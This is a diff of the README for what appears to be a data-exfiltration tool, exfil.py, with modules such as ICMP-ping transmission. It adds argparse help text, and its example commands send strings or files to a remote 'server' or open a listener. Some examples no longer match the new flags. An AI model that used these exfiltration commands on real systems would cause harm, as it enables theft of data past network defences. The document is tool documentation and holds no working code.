@@ -18,17 +18,27 @@ Modules
 * `ping_data` - Transmit data using ICMP ping packets with data as defined here http://blog.c22.cc/2012/02/17/quick-post-fun-with-python-ctypes-simpleicmp/
 
 
-Options
--------
-* `-d string` - Send a string of data.
-* `-f filename` - Send the specified file.
-* `-l port` - Listen for a connection on the specified port. If no port is give then use the default port for the module.
-* `-m module_name` - Transmit data using the specified module.
-* `-s server[:port]` - Server where data should be sent. If no port is specified, then use the default port for the module.
-
-
 Usage
 -----
+usage: exfil.py [-h] (-d string | -f filename) (-l | -s server) [-p port] module_name
+
+Exfiltrate data.
+
+positional arguments:
+  module_name  Exfiltration module to use.
+
+optional arguments:
+  -h, --help   show this help message and exit
+  -d string    String of data to exfiltrate.
+  -f filename  File to send.
+  -l           Listen for a connection.
+  -s server    Server where data should be sent. Can be a hostname
+  or an IP address.
+  -p port      Port to use when listening or connecting.
+
+
+Examples
+--------
 Start a listener: exfil -l <port> -m module_name
 Send a string of data: exfile -s server[:port] -d String_of_data -m module_name
 Send a file: exfil -s server[:port] -f file_to_send -m module_name
